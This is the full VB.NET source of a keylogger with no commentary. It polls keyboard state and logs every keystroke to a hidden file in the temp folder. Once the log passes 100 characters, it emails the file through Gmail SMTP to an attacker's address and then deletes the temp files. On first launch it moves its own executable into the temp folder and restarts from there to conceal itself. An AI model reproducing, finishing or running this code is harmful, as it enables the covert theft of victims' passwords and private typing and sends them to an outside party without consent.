Imports System.Diagnostics, System.IO, System.Net.Mail
Public Module Module1
    Public l = Nothing, q = 0, t = ".txt", p = Environ("temp") & "\"
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    Public Sub Main()
        If Reflection.Assembly.GetExecutingAssembly.Location = Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName Then
            While 1
                Threading.Thread.Sleep(10)
                For i As Integer = 8 To 222
                    Select Case i
                        Case 8, 13, 32, 48 To 57, 65 To 90, 186 To 192, 219 To 222
                            If GetAsyncKeyState(i) = -32767 AndAlso Not My.Computer.Keyboard.CtrlKeyDown Then
                                Dim a = Not My.Computer.Keyboard.CapsLock And Not My.Computer.Keyboard.ShiftKeyDown, m = My.Computer.Keyboard.ShiftKeyDown
                                If GetAsyncKeyState(8) Then
                                    If My.Computer.FileSystem.FileExists(p & q & t) Then
                                        Dim j = My.Computer.FileSystem.ReadAllText(p & q & t)
                                        If Not j = "" Then
                                            My.Computer.FileSystem.WriteAllText(p & q & t, Left(j, Len(j) - 1), False)
                                        End If
                                    End If
                                ElseIf GetAsyncKeyState(13) Then
                                    l = vbNewLine
                                ElseIf GetAsyncKeyState(32) Then
                                    l = " "
                                ElseIf GetAsyncKeyState(48) Then
                                    l = If(m, ")", "0")
                                ElseIf GetAsyncKeyState(49) Then
                                    l = If(m, "!", "1")
                                ElseIf GetAsyncKeyState(50) Then
                                    l = If(m, "@", "2")
                                ElseIf GetAsyncKeyState(51) Then
                                    l = If(m, "#", "3")
                                ElseIf GetAsyncKeyState(52) Then
                                    l = If(m, "$", "4")
                                ElseIf GetAsyncKeyState(53) Then
                                    l = If(m, "%", "5")
                                ElseIf GetAsyncKeyState(54) Then
                                    l = If(m, "^", "6")
                                ElseIf GetAsyncKeyState(55) Then
                                    l = If(m, "&", "7")
                                ElseIf GetAsyncKeyState(56) Then
                                    l = If(m, "*", "8")
                                ElseIf GetAsyncKeyState(57) Then
                                    l = If(m, "(", "9")
                                ElseIf GetAsyncKeyState(65) Then
                                    l = If(a, "a", "A")
                                ElseIf GetAsyncKeyState(66) Then
                                    l = If(a, "b", "B")
                                ElseIf GetAsyncKeyState(67) Then
                                    l = If(a, "c", "C")
                                ElseIf GetAsyncKeyState(68) Then
                                    l = If(a, "d", "D")
                                ElseIf GetAsyncKeyState(69) Then
                                    l = If(a, "e", "E")
                                ElseIf GetAsyncKeyState(70) Then
                                    l = If(a, "f", "F")
                                ElseIf GetAsyncKeyState(71) Then
                                    l = If(a, "g", "G")
                                ElseIf GetAsyncKeyState(72) Then
                                    l = If(a, "h", "H")
                                ElseIf GetAsyncKeyState(73) Then
                                    l = If(a, "i", "I")
                                ElseIf GetAsyncKeyState(74) Then
                                    l = If(a, "j", "J")
                                ElseIf GetAsyncKeyState(75) Then
                                    l = If(a, "k", "K")
                                ElseIf GetAsyncKeyState(76) Then
                                    l = If(a, "l", "L")
                                ElseIf GetAsyncKeyState(77) Then
                                    l = If(a, "m", "M")
                                ElseIf GetAsyncKeyState(78) Then
                                    l = If(a, "n", "N")
                                ElseIf GetAsyncKeyState(79) Then
                                    l = If(a, "o", "O")
                                ElseIf GetAsyncKeyState(80) Then
                                    l = If(a, "p", "P")
                                ElseIf GetAsyncKeyState(81) Then
                                    l = If(a, "q", "Q")
                                ElseIf GetAsyncKeyState(82) Then
                                    l = If(a, "r", "R")
                                ElseIf GetAsyncKeyState(83) Then
                                    l = If(a, "s", "S")
                                ElseIf GetAsyncKeyState(84) Then
                                    l = If(a, "t", "T")
                                ElseIf GetAsyncKeyState(85) Then
                                    l = If(a, "u", "U")
                                ElseIf GetAsyncKeyState(86) Then
                                    l = If(a, "v", "V")
                                ElseIf GetAsyncKeyState(87) Then
                                    l = If(a, "w", "W")
                                ElseIf GetAsyncKeyState(88) Then
                                    l = If(a, "x", "X")
                                ElseIf GetAsyncKeyState(89) Then
                                    l = If(a, "y", "Y")
                                ElseIf GetAsyncKeyState(90) Then
                                    l = If(a, "z", "Z")
                                ElseIf GetAsyncKeyState(186) Then
                                    l = If(m, ":", ";")
                                ElseIf GetAsyncKeyState(187) Then
                                    l = If(m, "+", "=")
                                ElseIf GetAsyncKeyState(188) Then
                                    l = If(m, "<", ",")
                                ElseIf GetAsyncKeyState(189) Then
                                    l = If(m, "_", "-")
                                ElseIf GetAsyncKeyState(190) Then
                                    l = If(m, ">", ".")
                                ElseIf GetAsyncKeyState(191) Then
                                    l = If(m, "?", "/")
                                ElseIf GetAsyncKeyState(192) Then
                                    l = If(m, "~", "`")
                                ElseIf GetAsyncKeyState(219) Then
                                    l = If(m, "{", "[")
                                ElseIf GetAsyncKeyState(220) Then
                                    l = If(m, "|", "\")
                                ElseIf GetAsyncKeyState(221) Then
                                    l = If(m, "}", "]")
                                ElseIf GetAsyncKeyState(222) Then
                                    l = If(m, """", "'")
                                End If
                                My.Computer.FileSystem.WriteAllText(p & q & t, l, True)
                                l = Nothing
                                If My.Computer.FileSystem.FileExists(p & q & t) Then
                                    If My.Computer.FileSystem.ReadAllText(p & q & t).Length > "100" Then
                                        Try  'Send mail
                                            Using Attachment = New Attachment(p & q & t)
                                                Using g As New MailMessage With {.Subject = "This is subject last"}
                                                    Dim email = "[email]"
                                                    g.To.Add(email)
                                                    g.From = New MailAddress(email)
                                                    g.Body = "This is body last"
                                                    g.Attachments.Add(Attachment)
                                                    Using SMTP As New SmtpClient("smtp.gmail.com") With {.EnableSsl = True, .Credentials = New Net.NetworkCredential(email, "[password]"), .Port = "587"}
                                                        SMTP.Send(g)
                                                    End Using
                                                End Using
                                            End Using
                                        Catch
                                        End Try
                                        q += 1
                                        For Each d As String In Directory.GetFiles(p) 'Delete temp files
                                            If File.Exists(d) Then
                                                Try
                                                    File.Delete(d)
                                                Catch
                                                End Try
                                            End If
                                        Next
                                    End If
                                End If
                            End If
                        Case Else
                            Exit Select
                    End Select
                Next
            End While
        Else
            If File.Exists(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName) Then
                System.IO.File.Delete(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
            End If
            IO.File.Move(System.Reflection.Assembly.GetExecutingAssembly.Location, Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
            Threading.Thread.Sleep(1000)
            Process.Start(Environ("temp") & "\" & AppDomain.CurrentDomain.FriendlyName)
        End If
    End Sub
End Module
